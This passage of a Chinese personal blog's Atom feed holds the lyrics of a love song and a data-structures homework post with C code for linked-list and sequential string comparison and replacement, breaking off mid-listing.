    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>​        那一年放肆的自由</p><p>　　就这样牵起你的手</p><p>　　不懂什么温柔不顾你的感受</p><p>　　寂寞总把我冲昏头</p><p>　　是你体谅我的任性要求</p><p>　　在别人都放弃了我以后</p><p>　　沉默的心为你再次悸动</p><p>　　浩瀚宇宙美不胜收</p><p>　　只是我不配再把你拥有</p><p>　　当你独自面对回忆汹涌</p><p>　　那一年雪都下的很沉重</p><p>　　不敢回头明知你泪在流</p><p>　　泛黄的日记写永久</p><p>　　讽刺我现在才会懂</p><p>　　怀念你的温柔还有什么感受</p><p>　　寂寞让我习惯了痛</p><p>　　是你体谅我的任性要求</p><p>　　在别人都放弃了我以后</p><p>　　沉默的心为你再次悸动</p><p>　　浩瀚宇宙美不胜收</p><p>　　只是我不配再把你拥有</p><p>　　当你独自面对回忆汹涌</p><p>　　那一年雪都下的很沉重</p><p>　　不敢回头明知你泪在流</p><p>　　我们爱到尽头谁都不肯放手</p><p>　　不如坏人就由我担当承受</p><p>　　不管你懂不懂我成全的疼痛</p><p>　　是你体谅我的任性要求</p><p>　　在别人都放弃了我以后</p><p>　　沉默的心为你再次悸动</p><p>　　浩瀚宇宙美不胜收</p><p>　　只是我不配把你拥有</p><p>　　当你独自面对回忆汹涌</p><p>　　那一年雪都下的很沉重</p><p>　　不敢回头明知你泪在流</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="音乐分享" scheme="https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>第四章、第五章习题（字符串、数组、矩阵）</title>
    <link href="https://xizhi-future.github.io/2021/10/26/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%81%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%B9%A0%E9%A2%98%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E7%9F%A9%E9%98%B5%EF%BC%89/"/>
    <id>https://xizhi-future.github.io/2021/10/26/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%81%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%B9%A0%E9%A2%98%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E7%9F%A9%E9%98%B5%EF%BC%89/</id>
    <published>2021-10-26T12:51:29.000Z</published>
    <updated>2021-10-26T12:52:59.347Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="1-试编写一个函数，实现在-链式存储方式-下字符串的-strcompare-S1-S2"><a href="#1-试编写一个函数，实现在-链式存储方式-下字符串的-strcompare-S1-S2" class="headerlink" title="1. 试编写一个函数，实现在 链式存储方式 下字符串的 strcompare(S1,S2)"></a>1. 试编写一个函数，实现在 <code>链式存储方式</code> 下字符串的 <code>strcompare(S1,S2)</code></h2><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//进行比较</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(linkstrnode *S1,linkstrnode *S2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S1 &amp;&amp; S2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S1-&gt;data &gt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(S1-&gt;data &lt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        S1 = S1-&gt;next;</span><br><span class="line">        S2 = S2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(S1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(S2)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linkstrnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> linkstrnode *linkstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建单链表  尾插法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">strcreate</span><span class="params">(linkstring *S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    linkstrnode *p,*r;</span><br><span class="line">    *S = <span class="literal">NULL</span>;</span><br><span class="line">    r = <span class="literal">NULL</span>; <span class="comment">//r始终指向当前链式串最后一个字符对应的结点</span></span><br><span class="line">    <span class="keyword">while</span>((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (linkstrnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linkstrnode));</span><br><span class="line">        p-&gt;data = ch;</span><br><span class="line">        <span class="keyword">if</span>(*S == <span class="literal">NULL</span>) <span class="comment">//本为空表</span></span><br><span class="line">            *S = p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = p; <span class="comment">//不为空表</span></span><br><span class="line">        r = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>; <span class="comment">//处理尾结点指针域</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(linkstring head)</span></span>&#123;</span><br><span class="line">    linkstrnode *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c-&gt;&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//进行比较</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(linkstrnode *S1,linkstrnode *S2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S1 &amp;&amp; S2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S1-&gt;data &gt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(S1-&gt;data &lt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        S1 = S1-&gt;next;</span><br><span class="line">        S2 = S2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(S1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(S2)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    linkstring s1,s2;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入第一个字符串 s1：&quot;</span>);</span><br><span class="line">    strcreate(&amp;s1);</span><br><span class="line">    print(s1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入第二个字符串 s2：&quot;</span>);</span><br><span class="line">    strcreate(&amp;s2);</span><br><span class="line">    print(s2);</span><br><span class="line">    k = strcompare(s1,s2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n比较的结果为：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(k == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 &gt; s2&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(k == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 &lt; s2&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 == s2&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/22/OAhsKJBz8ECf54n.png" alt="image-20211022180148858"></p><h2 id="2-试编写一个函数，实现在-顺序存储方式-下字符串的-replace-S-T1-T2-运算"><a href="#2-试编写一个函数，实现在-顺序存储方式-下字符串的-replace-S-T1-T2-运算" class="headerlink" title="2. 试编写一个函数，实现在 顺序存储方式 下字符串的 replace(S,T1,T2) 运算"></a>2. 试编写一个函数，实现在 <code>顺序存储方式</code> 下字符串的 <code>replace(S,T1,T2)</code> 运算</h2><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//replace 运算</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replace</span><span class="params">(seqstring *s,seqstring t1,seqstring t2,<span class="keyword">int</span> next[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,c,m;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; s-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; s-&gt;length &amp;&amp; j &lt; t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">-1</span> || s-&gt;str[i] == t1.str[j])</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j == t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            c = i-t1.length;</span><br><span class="line">            <span class="keyword">if</span>(t1.length == t2.length)</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(t1.length &lt; t2.length)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = s-&gt;length<span class="number">-1</span>;m &gt; i<span class="number">-1</span>;m--)</span><br><span class="line">                    s-&gt;str[t2.length-t1.length+m] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k &lt; t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length-t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = i<span class="number">-1</span>;m &lt; s-&gt;length;m++)</span><br><span class="line">                    s-&gt;str[m-t1.length + t2.length] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length - t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i = i+t2.length - t1.length;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> str[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;seqstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">//求模式 next 函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getnext</span><span class="params">(seqstring p,<span class="keyword">int</span> next[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; p.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">-1</span> || p.str[i] == p.str[j])&#123;</span><br><span class="line">            ++i;</span><br><span class="line">            ++j;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">            j = next[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//replace 运算</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replace</span><span class="params">(seqstring *s,seqstring t1,seqstring t2,<span class="keyword">int</span> next[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,c,m;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; s-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; s-&gt;length &amp;&amp; j &lt; t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">-1</span> || s-&gt;str[i] == t1.str[j])</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j == t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            c = i-t1.length;</span><br><span class="line">            <span class="keyword">if</span>(t1.length == t2.length)</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(t1.length &lt; t2.length)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = s-&gt;length<span class="number">-1</span>;m &gt; i<span class="number">-1</span>;m--)</span><br><span class="line">                    s-&gt;str[t2.length-t1.length+m] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k &lt; t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length-t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = i<span class="number">-1</span>;m &lt; s-&gt;length;m++)</span><br><span class="line">                    s-&gt;str[m-t1.length + t2.length] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length - t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i = i+t2.length - t1.length;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> next[MAXSIZE];</span><br><span class="line">    seqstring s,t1,t2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 s：&quot;</span>);</span><br><span class="line">    gets(s.str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 t1：&quot;</span>);</span><br><span class="line">    gets(t1.str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 t2：&quot;</span>);</span><br><span class="line">    gets(t2.str);</span><br><span class="line">    s.length = <span class="built_in">strlen</span>(s.str);</span><br><span class="line">    t1.length = <span class="built_in">strlen</span>(t1.str);</span><br><span class="line">    t2.length = <span class="built_in">strlen</span>(t2.str);</span><br><span class="line">    getnext(t1,next);</span><br><span class="line">    replace(&amp;s,t1,t2,next);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;替换后的结果是：&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(s.str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/22/HVelDLsqSZ78iAB.png" alt="image-20211022190113984"></p><h2 id="3-编写一个函数，实现在链式存储方式下字符串的-replace-S-T1-T2"><a href="#3-编写一个函数，实现在链式存储方式下字符串的-replace-S-T1-T2" class="headerlink" title="3. 编写一个函数，实现在链式存储方式下字符串的 replace(S,T1,T2)"></a>3. 编写一个函数，实现在链式存储方式下字符串的 <code>replace(S,T1,T2)</code></h2><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//replace 函数</span></span><br><span class="line"><span class="function">linkstring <span class="title">replace</span><span class="params">(linkstring S,linkstring T1,linkstring T2)</span></span>&#123;</span><br><span class="line">    linkstring p,q,r,s,pre,temp,pos;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (S == <span class="literal">NULL</span>|| T1 == <span class="literal">NULL</span> )  <span class="comment">//若 S 为空或 T1 为空,则原串不变</span></span><br><span class="line">        <span class="keyword">return</span> S; </span><br><span class="line">    pre = <span class="literal">NULL</span>;</span><br><span class="line">    pos = S; <span class="comment">/*pos 表示可能的 T1 串在 S 中的起始位置*/</span></span><br><span class="line">    <span class="keyword">while</span> (pos &amp;&amp; flag)</span><br><span class="line">    &#123;</span><br><span class="line">        p = pos;</span><br><span class="line">        q = T1;</span><br><span class="line">        <span class="keyword">while</span>(p &amp;&amp; q)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;data == q-&gt;data)&#123;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">                q = q-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre = pos;</span><br><span class="line">                pos = pos-&gt;next;</span><br><span class="line">                p = pos;</span><br><span class="line">                q = T1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(q != <span class="literal">NULL</span>)</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            r = pos;</span><br><span class="line">            <span class="keyword">while</span>(r != p)</span><br><span class="line">            &#123;</span><br><span class="line">                s = r;</span><br><span class="line">                r = r-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(T2 != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                temp = r = copy(T2);</span><br><span class="line">                <span class="keyword">while</span>(r-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">                    r = r-&gt;next;</span><br><span class="line">                r-&gt;next = p;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = temp;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    pre-&gt;next = temp;</span><br><span class="line">                pre = r;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = p;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    pre-&gt;next = p;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> S;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 